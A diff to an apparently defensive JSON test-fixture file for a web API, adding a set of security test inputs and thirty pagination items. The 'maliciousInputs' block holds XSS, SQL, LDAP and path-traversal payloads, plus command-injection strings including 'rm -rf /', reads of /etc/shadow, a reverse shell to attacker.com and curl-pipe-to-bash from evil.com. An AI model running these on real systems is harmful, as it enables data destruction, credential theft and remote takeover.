@@ -95,7 +95,7 @@
         "category": "electronics"
       },
       "pagination": {
-        "page": "3",
+        "page": "1",
         "limit": "20",
         "sort": "createdAt",
         "order": "desc"
@@ -729,6 +729,98 @@
           }
         }
       ]
+    },
+    "maliciousInputs": {
+      "xssAttempts": [
+        {
+          "type": "script_tag",
+          "description": "Basic script tag injection",
+          "payload": "<script>alert('XSS')</script>"
+        },
+        {
+          "type": "img_onerror",
+          "description": "Image tag with onerror event",
+          "payload": "<img src=x onerror=alert('XSS')>"
+        },
+        {
+          "type": "svg_onload",
+          "description": "SVG element with onload event",
+          "payload": "<svg onload=alert('XSS')>"
+        },
+        {
+          "type": "javascript_protocol",
+          "description": "JavaScript protocol injection",
+          "payload": "javascript:alert('XSS')"
+        },
+        {
+          "type": "iframe_injection",
+          "description": "Iframe with JavaScript source",
+          "payload": "<iframe src=javascript:alert('XSS')></iframe>"
+        }
+      ],
+      "sqlInjectionAttempts": [
+        {
+          "type": "drop_table",
+          "description": "Table dropping SQL injection",
+          "payload": "'; DROP TABLE users; --"
+        },
+        {
+          "type": "boolean_bypass",
+          "description": "Boolean-based authentication bypass",
+          "payload": "' OR '1'='1"
+        },
+        {
+          "type": "union_select",
+          "description": "Union-based data extraction",
+          "payload": "1' UNION SELECT * FROM sensitive_table --"
+        },
+        {
+          "type": "comment_bypass",
+          "description": "Comment-based bypass",
+          "payload": "admin'--"
+        },
+        {
+          "type": "or_injection",
+          "description": "OR condition injection",
+          "payload": "' OR 1=1 --"
+        }
+      ],
+      "commandInjectionAttempts": [
+        "; ls -la",
+        "| cat /etc/passwd",
+        "&& rm -rf /",
+        "; cat /etc/shadow",
+        "|| whoami",
+        "`id`",
+        "$(whoami)",
+        "; nc -e /bin/sh attacker.com 4444",
+        "| wget http://malicious.com/malware.sh",
+        "; curl http://evil.com/payload.sh | bash"
+      ],
+      "pathTraversalAttempts": [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32\\config\\sam",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "/var/www/../../etc/passwd",
+        "\\..\\..\\..\\etc\\passwd",
+        "file:///etc/passwd",
+        "/proc/self/environ",
+        "/dev/null; cat /etc/passwd"
+      ],
+      "ldapInjectionAttempts": [
+        "*)(uid=*",
+        "*)(|(uid=*))",
+        "admin)(&(password=*))",
+        "*)(|(cn=*))",
+        "*))(|(objectClass=*",
+        "*))%00",
+        "admin)((cn=*))",
+        "*)(uid=admin)(password=*",
+        "*)(|(userPassword=*))",
+        "*)(|(mail=*))"
+      ]
     }
   },
   "authenticationTestData": {
@@ -934,6 +1026,218 @@
       "expectedError": "Service temporarily unavailable"
     }
   },
+  "paginationTestItems": [
+    {
+      "name": "Pagination Item 1",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 19.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 2", 
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 29.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 3",
+      "description": "Test item for pagination testing", 
+      "category": "pagination",
+      "price": 39.99,
+      "inStock": false
+    },
+    {
+      "name": "Pagination Item 4",
+      "description": "Test item for pagination testing",
+      "category": "pagination", 
+      "price": 49.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 5",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 59.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 6",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 69.99,
+      "inStock": false
+    },
+    {
+      "name": "Pagination Item 7",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 79.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 8",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 89.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 9",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 99.99,
+      "inStock": false
+    },
+    {
+      "name": "Pagination Item 10",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 109.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 11",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 119.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 12",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 129.99,
+      "inStock": false
+    },
+    {
+      "name": "Pagination Item 13",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 139.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 14",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 149.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 15",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 159.99,
+      "inStock": false
+    },
+    {
+      "name": "Pagination Item 16",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 169.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 17",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 179.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 18",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 189.99,
+      "inStock": false
+    },
+    {
+      "name": "Pagination Item 19",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 199.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 20",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 209.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 21",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 219.99,
+      "inStock": false
+    },
+    {
+      "name": "Pagination Item 22",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 229.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 23",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 239.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 24",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 249.99,
+      "inStock": false
+    },
+    {
+      "name": "Pagination Item 25",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 259.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 26",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 269.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 27",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 279.99,
+      "inStock": false
+    },
+    {
+      "name": "Pagination Item 28",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 289.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 29",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 299.99,
+      "inStock": true
+    },
+    {
+      "name": "Pagination Item 30",
+      "description": "Test item for pagination testing",
+      "category": "pagination",
+      "price": 309.99,
+      "inStock": false
+    }
+  ],
   "performanceTestData": {
     "loadTestScenarios": {
       "lightLoad": {
